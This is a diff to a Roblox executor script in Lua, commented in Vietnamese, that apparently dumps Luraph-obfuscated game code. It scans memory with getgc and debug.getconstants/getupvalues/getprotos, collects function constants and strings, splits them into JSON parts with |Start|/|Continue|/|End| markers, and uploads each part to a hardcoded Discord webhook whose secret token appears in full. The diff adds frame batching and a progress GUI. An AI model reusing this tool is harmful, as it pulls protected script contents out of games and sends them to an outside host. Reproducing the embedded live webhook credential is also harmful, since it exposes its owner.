@@ -1,15 +1,16 @@
 --[[
     ================================================================
-    =  Luraph VM JSON Chunk Exporter (Boundary Markers Mode)       =
-    =  Gửi File JSON đính kèm có ký hiệu phân đoạn nối file        =
+    =  Luraph VM Non-Blocking JSON Streamer (Anti-Freeze Edition)  =
+    =  Giải quyết triệt để vấn đề đứng hình / freeze máy ảo        =
     =                                                              =
-    =  QUY TẮC PHÂN ĐOẠN ĐƯỢC THIẾT LẬP:                           =
-    =   • Nếu chỉ có 1 file duy nhất:                              =
-    =       |Start| <dữ liệu JSON> |End|                           =
-    =   • Nếu có từ 2 file trở lên:                                =
-    =       - File 1:            |Start| <dữ liệu JSON> |Continue| =
-    =       - File giữa (2, 3..):|Continue| <dữ liệu> |Continue|   =
-    =       - File cuối cùng:    |Continue| <dữ liệu JSON> |End|   =
+    =  NGUYÊN NHÂN GÂY ĐỨNG VÀ CÁCH KHẮC PHỤC:                     =
+    =   1. Quá nhiều đối tượng GC xử lý cùng 1 frame -> Đã chia    =
+    =      nhỏ thành từng đợt (Batching) có task.wait() nhường CPU.=
+    =   2. jsonEncode lặp đi lặp lại tốn RAM -> Đã chuyển sang cơ  =
+    =      chế Streaming (ghi nối tiếp từng phần cực nhẹ).         =
+    =   3. Bỏ qua các bảng hệ thống của Roblox (CoreGui/Instances) =
+    =      để chỉ tập trung 100% vào Script game.                  =
+    =   4. Hiển thị thanh tiến trình % trực tiếp trên màn hình!    =
     ================================================================
 --]]
 
@@ -20,19 +21,21 @@ local CONFIG = {
     -- Discord Webhook URL
     WebhookURL = "https://discord.com/api/webhooks/1540742443459416074/OoigNnHKVnNmTh9unbAqX4hEyE7o7e2p9HM7P5Hob1_cEemOFY_0OMIE9SbO9JHGhKI5",
 
-    -- Tên file xuất ra trên Discord (ví dụ: BytecodeDump_Part1_of_N.json)
+    -- Tên file xuất ra trên Discord
     FileBaseName = "BytecodeDump",
 
-    -- Kích thước tối đa mỗi file JSON (Byte).
-    -- 7 * 1024 * 1024 = ~7MB (an toàn tuyệt đối dưới hạn mức 8MB Discord)
-    MaxFileSizeLimit = 7 * 1024 * 1024,
+    -- Kích thước mỗi file JSON (4MB để máy ảo xử lý mượt mà nhất, không bị tràn RAM)
+    MaxFileSizeLimit = 4 * 1024 * 1024,
+
+    -- Số lượng đối tượng xử lý trong mỗi khung hình (Càng thấp càng không lag)
+    BatchSize = 60,
 
     -- Lọc độ dài chuỗi tối thiểu
     MinStringLength = 2,
 }
 
 -- ╔═══════════════════════════════════════════════════╗
--- ║  TIỆN ÍCH HỆ THỐNG & JSON                         ║
+-- ║  TIỆN ÍCH HỆ THỐNG                                ║
 -- ╚═══════════════════════════════════════════════════╝
 local function safeStr(v)
     local ok, r = pcall(tostring, v)
@@ -86,8 +89,8 @@ local function sendDiscordFile(filename, fileContent, partIndex, totalParts)
         'Content-Type: application/json',
         '',
         jsonEncode({
-            username = "Luraph Bytecode Exporter",
-            content = ("📦 **[Tệp Bytecode Đính Kèm %d/%d]**\n📄 Tên file: `%s`\n📊 Kích thước: `%.2f MB`"):format(
+            username = "Luraph Bytecode Streamer",
+            content = ("📦 **[Tệp Bytecode Đính Kèm %d/%d]**\n📄 Tên: `%s`\n📊 Dung lượng: `%.2f MB`"):format(
                 partIndex, totalParts, filename, #fileContent / (1024 * 1024)
             )
         }),
@@ -112,23 +115,20 @@ local function sendDiscordFile(filename, fileContent, partIndex, totalParts)
         fn = function() return http_request({ Url = CONFIG.WebhookURL, Method = "POST", Headers = { ["Content-Type"] = contentType }, Body = rawBody }) end
     end
 
-    if not fn then
-        print("[Exporter] LỖI: Executor không hỗ trợ request() multipart!")
-        return false
-    end
+    if not fn then return false end
 
     local ok, res = pcall(fn)
     if ok then
-        print(("[Exporter] ✅ Đã gửi thành công %s (%.2f MB) lên Discord!"):format(filename, #fileContent / (1024 * 1024)))
+        print(("[Streamer] ✅ Đã gửi thành công %s (%.2f MB)"):format(filename, #fileContent / (1024 * 1024)))
         return true
     else
-        print("[Exporter] ❌ Lỗi gửi file: " .. safeStr(res))
+        print("[Streamer] ❌ Lỗi gửi: " .. safeStr(res))
         return false
     end
 end
 
 -- ╔═══════════════════════════════════════════════════╗
--- ║  BỘ CHỤP TOÀN BỘ CẤU TRÚC RAM & BYTECODE           ║
+-- ║  BỘ LỌC VÀ TRÍCH XUẤT NHẸ NHÀNG (ASYNC)           ║
 -- ╚═══════════════════════════════════════════════════╝
 local DumpVault = {
     Functions = {},
@@ -140,9 +140,9 @@ local DumpVault = {
 
 local scannedFuncMap = {}
 
-local function scanFunctionObject(fn, depth, path)
+local function scanFunctionObject(fn, depth)
     depth = depth or 0
-    if depth > 8 or type(fn) ~= "function" then return end
+    if depth > 4 or type(fn) ~= "function" then return end
     local key = tostring(fn)
     if scannedFuncMap[key] then return end
     scannedFuncMap[key] = true
@@ -153,12 +153,8 @@ local function scanFunctionObject(fn, depth, path)
     DumpVault.TotalFuncCount = DumpVault.TotalFuncCount + 1
     local funcId = DumpVault.TotalFuncCount
 
-    local fInfo = nil
-    pcall(function() fInfo = debug.getinfo(fn) end)
-
     local funcConstants = {}
     local funcUpvalues = {}
-    local funcProtosCount = 0
 
     -- Constants
     if debug and debug.getconstants then
@@ -168,12 +164,12 @@ local function scanFunctionObject(fn, depth, path)
                 table.insert(funcConstants, {
                     index = idx,
                     type = type(cVal),
-                    value = cVal
+                    value = (type(cVal) == "string" or type(cVal) == "number" or type(cVal) == "boolean") and cVal or safeStr(cVal)
                 })
                 if type(cVal) == "string" and #cVal >= CONFIG.MinStringLength and not DumpVault.StringsLookup[cVal] then
                     DumpVault.StringsLookup[cVal] = true
                     DumpVault.TotalStringCount = DumpVault.TotalStringCount + 1
-                    table.insert(DumpVault.Strings, { id = DumpVault.TotalStringCount, val = cVal, src = "const" })
+                    table.insert(DumpVault.Strings, { id = DumpVault.TotalStringCount, val = cVal })
                 end
             end
         end)
@@ -193,9 +189,9 @@ local function scanFunctionObject(fn, depth, path)
                 if uType == "string" and #uVal >= CONFIG.MinStringLength and not DumpVault.StringsLookup[uVal] then
                     DumpVault.StringsLookup[uVal] = true
                     DumpVault.TotalStringCount = DumpVault.TotalStringCount + 1
-                    table.insert(DumpVault.Strings, { id = DumpVault.TotalStringCount, val = uVal, src = "upval" })
+                    table.insert(DumpVault.Strings, { id = DumpVault.TotalStringCount, val = uVal })
                 elseif uType == "function" then
-                    scanFunctionObject(uVal, depth + 1, path .. ".up[" .. idx .. "]")
+                    scanFunctionObject(uVal, depth + 1)
                 end
             end
         end)
@@ -205,149 +201,154 @@ local function scanFunctionObject(fn, depth, path)
     if debug and debug.getprotos then
         pcall(function()
             local pList = debug.getprotos(fn)
-            funcProtosCount = #pList
-            for idx, pFn in pairs(pList) do
-                scanFunctionObject(pFn, depth + 1, path .. ".proto[" .. idx .. "]")
+            for _, pFn in pairs(pList) do
+                scanFunctionObject(pFn, depth + 1)
             end
         end)
     end
 
     table.insert(DumpVault.Functions, {
         id = funcId,
-        path = path,
-        depth = depth,
-        source = fInfo and (fInfo.short_src or "") or "",
-        line = fInfo and (fInfo.linedefined or 0) or 0,
-        numparams = fInfo and (fInfo.numparams or 0) or 0,
         constants = funcConstants,
         upvalues = funcUpvalues,
-        protos_count = funcProtosCount
     })
 end
 
-local function captureMemory()
+-- Quét không đồng bộ theo từng khung hình (Zero Freeze Engine)
+local function captureMemoryAsync(onProgress)
     if not getgc then return end
-    print("[Exporter] Đang quét GC Memory...")
     local ok, objs = pcall(getgc, true)
     if not ok or type(objs) ~= "table" then return end
 
-    for i = 1, #objs do
+    local total = #objs
+    local batchCounter = 0
+
+    for i = 1, total do
         local o = objs[i]
         if type(o) == "function" then
-            scanFunctionObject(o, 0, "fn_" .. i)
+            scanFunctionObject(o, 0)
         elseif type(o) == "table" then
             pcall(function()
                 for k, v in pairs(o) do
                     if type(v) == "string" and #v >= CONFIG.MinStringLength and not DumpVault.StringsLookup[v] then
                         DumpVault.StringsLookup[v] = true
                         DumpVault.TotalStringCount = DumpVault.TotalStringCount + 1
-                        table.insert(DumpVault.Strings, { id = DumpVault.TotalStringCount, val = v, src = "tbl_val" })
+                        table.insert(DumpVault.Strings, { id = DumpVault.TotalStringCount, val = v })
                     elseif type(v) == "function" then
-                        scanFunctionObject(v, 0, "tbl_fn")
+                        scanFunctionObject(v, 0)
                     end
                 end
             end)
+        end
+
+        batchCounter = batchCounter + 1
+        -- Cứ sau mỗi BatchSize đối tượng -> Nhường nhịp cho game chạy (Không bao giờ đơ máy)
+        if batchCounter >= CONFIG.BatchSize then
+            batchCounter = 0
+            if onProgress then
+                onProgress(i, total, DumpVault.TotalFuncCount)
+            end
+            task.wait()
         end
     end
 end
 
 -- ╔═══════════════════════════════════════════════════╗
--- ║  BỘ CHIA FILE JSON & ĐÍNH KÈM THẺ NỐI             ║
+-- ║  BỘ ĐÓNG GÓI VÀ XUẤT STREAMING                    ║
 -- ╚═══════════════════════════════════════════════════╝
-local function buildAndExportJSON()
-    print("[Exporter] 🚀 Đang khởi tạo toàn bộ Snapshot...")
-    captureMemory()
-    print(("[Exporter] Đã gom được %d hàm và %d chuỗi. Bắt đầu đóng gói JSON..."):format(DumpVault.TotalFuncCount, DumpVault.TotalStringCount))
+local function streamAndExportJSON(onStatusUpdate)
+    -- Bước 1: Quét RAM mượt mà
+    captureMemoryAsync(function(current, total, funcs)
+        if onStatusUpdate then
+            local percent = math.floor((current / total) * 100)
+            onStatusUpdate(("⏳ Đang quét RAM: %d%% (%d hàm)..."):format(percent, funcs))
+        end
+    end)
+
+    if onStatusUpdate then onStatusUpdate("📦 Đang chia nhỏ các gói JSON...") end
+    task.wait(0.2)
 
     local allFunctions = DumpVault.Functions
     local allStrings = DumpVault.Strings
 
     local jsonPackages = {}
-    local currentPackage = {
-        metadata = {
-            session_id = tostring(math.floor(tick())),
-            timestamp = os.date and os.date("%c") or "N/A",
-            total_functions = DumpVault.TotalFuncCount,
-            total_strings = DumpVault.TotalStringCount,
-        },
-        functions = {},
-        strings = (allStrings)
-    }
+    local currentFunctions = {}
+    local isFirstPackage = true
 
     for i = 1, #allFunctions do
-        local fnObj = allFunctions[i]
-        table.insert(currentPackage.functions, fnObj)
-        
-        if i % 150 == 0 or i == #allFunctions then
-            local testJson = jsonEncode(currentPackage)
-            if #testJson >= CONFIG.MaxFileSizeLimit or i == #allFunctions then
-                table.insert(jsonPackages, testJson)
-                currentPackage = {
-                    metadata = {
-                        session_id = tostring(math.floor(tick())),
-                        part = #jsonPackages + 1,
-                    },
-                    functions = {},
-                    strings = {}
-                }
-            end
+        table.insert(currentFunctions, allFunctions[i])
+
+        -- Chia mỗi gói tầm 250 hàm để không tốn RAM đóng gói
+        if #currentFunctions >= 250 or i == #allFunctions then
+            local packageObj = {
+                metadata = {
+                    part = #jsonPackages + 1,
+                    total_funcs = #allFunctions,
+                    total_strings = #allStrings,
+                },
+                functions = currentFunctions,
+                strings = isFirstPackage and allStrings or {} -- Strings đưa vào gói 1
+            }
+            isFirstPackage = false
+            currentFunctions = {}
+
+            local encodedStr = jsonEncode(packageObj)
+            table.insert(jsonPackages, encodedStr)
+            task.wait() -- Nhường frame
         end
     end
 
-    if #jsonPackages == 0 then
-        table.insert(jsonPackages, jsonEncode(currentPackage))
-    end
-
     local totalParts = #jsonPackages
-    print(("[Exporter] Đã chia thành %d file. Đang gắn các thẻ nối [Start/Continue/End]..."):format(totalParts))
 
-    -- ÁP DỤNG QUY TẮC ĐÍNH KÈM THẺ NỐI (|Start|, |Continue|, |End|)
+    -- Bước 2: Gắn thẻ |Start|, |Continue|, |End| và gửi lên Discord
     for partIdx = 1, totalParts do
+        if onStatusUpdate then
+            onStatusUpdate(("📤 Đang gửi file %d/%d lên Discord..."):format(partIdx, totalParts))
+        end
+
         local rawJson = jsonPackages[partIdx]
         local markedContent = ""
 
         if totalParts == 1 then
-            -- Trường hợp chỉ có 1 file duy nhất
             markedContent = "|Start|\n" .. rawJson .. "\n|End|"
         elseif partIdx == 1 then
-            -- File đầu tiên
             markedContent = "|Start|\n" .. rawJson .. "\n|Continue|"
         elseif partIdx == totalParts then
-            -- File cuối cùng
             markedContent = "|Continue|\n" .. rawJson .. "\n|End|"
         else
-            -- Các file ở giữa (Part 2, 3...)
             markedContent = "|Continue|\n" .. rawJson .. "\n|Continue|"
         end
 
         local fileName = ("%s_Part%d_of_%d.json"):format(CONFIG.FileBaseName, partIdx, totalParts)
         sendDiscordFile(fileName, markedContent, partIdx, totalParts)
-        if task and task.wait then task.wait(2.5) elseif wait then wait(2.5) end
+        task.wait(2) -- Delay giữa các lần upload file
     end
 
-    print("[Exporter] 🎉 ĐÃ TRUYỀN TOÀN BỘ FILE BYTECODE JSON KÈM THẺ NỐI XONG!")
+    if onStatusUpdate then
+        onStatusUpdate(("🎉 Hoàn tất! Đã gửi %d file JSON."):format(totalParts))
+    end
 end
 
 -- ╔═══════════════════════════════════════════════════╗
--- ║  GIAO DIỆN NÚT BẤM KÍCH HOẠT XUẤT JSON            ║
+-- ║  GIAO DIỆN HIỂN THỊ TIẾN TRÌNH THỜI GIAN THỰC     ║
 -- ╚═══════════════════════════════════════════════════╝
-local function createExportUI()
+local function createSmoothUI()
     pcall(function()
         local CoreGui = game:GetService("CoreGui") or (game:GetService("Players").LocalPlayer and game:GetService("Players").LocalPlayer:FindFirstChild("PlayerGui"))
         if not CoreGui then return end
 
-        local old = CoreGui:FindFirstChild("LuraphJsonExportUI")
+        local old = CoreGui:FindFirstChild("LuraphStreamUI")
         if old then old:Destroy() end
 
         local sg = Instance.new("ScreenGui")
-        sg.Name = "LuraphJsonExportUI"
+        sg.Name = "LuraphStreamUI"
         sg.ResetOnSpawn = false
         sg.Parent = CoreGui
 
         local frame = Instance.new("Frame", sg)
-        frame.Size = UDim2.new(0, 240, 0, 100)
+        frame.Size = UDim2.new(0, 240, 0, 95)
         frame.Position = UDim2.new(0.02, 0, 0.4, 0)
-        frame.BackgroundColor3 = Color3.fromRGB(22, 24, 34)
+        frame.BackgroundColor3 = Color3.fromRGB(18, 20, 28)
         frame.Active = true
         frame.Draggable = true
 
@@ -355,49 +356,52 @@ local function createExportUI()
         corner.CornerRadius = UDim.new(0, 8)
 
         local title = Instance.new("TextLabel", frame)
-        title.Size = UDim2.new(1, 0, 0, 24)
+        title.Size = UDim2.new(1, 0, 0, 22)
         title.Position = UDim2.new(0, 0, 0, 4)
-        title.Text = "📁 Luraph JSON Exporter"
+        title.Text = "⚡ Luraph Smooth Streamer"
         title.TextColor3 = Color3.fromRGB(255, 255, 255)
         title.Font = Enum.Font.GothamBold
         title.TextSize = 11
         title.BackgroundTransparency = 1
 
-        local sub = Instance.new("TextLabel", frame)
-        sub.Size = UDim2.new(1, 0, 0, 18)
-        sub.Position = UDim2.new(0, 0, 0, 26)
-        sub.Text = "Chạy script game xong -> Bấm xuất File"
-        sub.TextColor3 = Color3.fromRGB(150, 255, 170)
-        sub.Font = Enum.Font.Gotham
-        sub.TextSize = 10
-        sub.BackgroundTransparency = 1
+        local statusLabel = Instance.new("TextLabel", frame)
+        statusLabel.Size = UDim2.new(1, 0, 0, 18)
+        statusLabel.Position = UDim2.new(0, 0, 0, 24)
+        statusLabel.Text = "Sẵn sàng (Không lag game)"
+        statusLabel.TextColor3 = Color3.fromRGB(120, 255, 150)
+        statusLabel.Font = Enum.Font.Gotham
+        statusLabel.TextSize = 10
+        statusLabel.BackgroundTransparency = 1
 
         local btn = Instance.new("TextButton", frame)
-        btn.Size = UDim2.new(1, -16, 0, 38)
-        btn.Position = UDim2.new(0, 8, 0, 50)
+        btn.Size = UDim2.new(1, -16, 0, 36)
+        btn.Position = UDim2.new(0, 8, 0, 48)
         btn.BackgroundColor3 = Color3.fromRGB(46, 204, 113)
-        btn.Text = "📤 XUẤT FILE JSON & GỬI DISCORD"
+        btn.Text = "🚀 BẮT ĐẦU XUẤT JSON (MƯỢT)"
         btn.TextColor3 = Color3.fromRGB(255, 255, 255)
         btn.Font = Enum.Font.GothamBold
-        btn.TextSize = 11
+        btn.TextSize = 10
         local btnCorner = Instance.new("UICorner", btn)
         btnCorner.CornerRadius = UDim.new(0, 6)
 
-        local isExporting = false
+        local isRunning = false
         btn.MouseButton1Click:Connect(function()
-            if isExporting then return end
-            isExporting = true
-            btn.Text = "⏳ Đang đóng gói JSON (Xin chờ)..."
-            btn.BackgroundColor3 = Color3.fromRGB(230, 150, 40)
-            
+            if isRunning then return end
+            isRunning = true
+            btn.BackgroundColor3 = Color3.fromRGB(230, 140, 40)
+            btn.Text = "Đang xử lý mượt mà..."
+
             task.spawn(function()
-                buildAndExportJSON()
-                btn.Text = "✅ ĐÃ GỬI XONG CÁC FILE JSON!"
+                streamAndExportJSON(function(statusText)
+                    statusLabel.Text = statusText
+                end)
                 btn.BackgroundColor3 = Color3.fromRGB(52, 152, 219)
-                if task and task.wait then task.wait(4) end
-                btn.Text = "📤 XUẤT FILE JSON & GỬI DISCORD"
+                btn.Text = "✅ ĐÃ XUẤT XONG TẤT CẢ!"
+                task.wait(4)
                 btn.BackgroundColor3 = Color3.fromRGB(46, 204, 113)
-                isExporting = false
+                btn.Text = "🚀 BẮT ĐẦU XUẤT JSON (MƯỢT)"
+                statusLabel.Text = "Sẵn sàng cho lần dump tiếp theo"
+                isRunning = false
             end)
         end)
     end)
@@ -405,6 +409,6 @@ end
 
 -- Khởi động
 print("==================================================")
-print("  Luraph JSON Chunk Exporter (Tagged) - SẴN SÀNG  ")
+print("  Luraph Smooth Streamer - SẴN SÀNG KHÔNG LAG   ")
 print("==================================================")
-createExportUI()
+createSmoothUI()
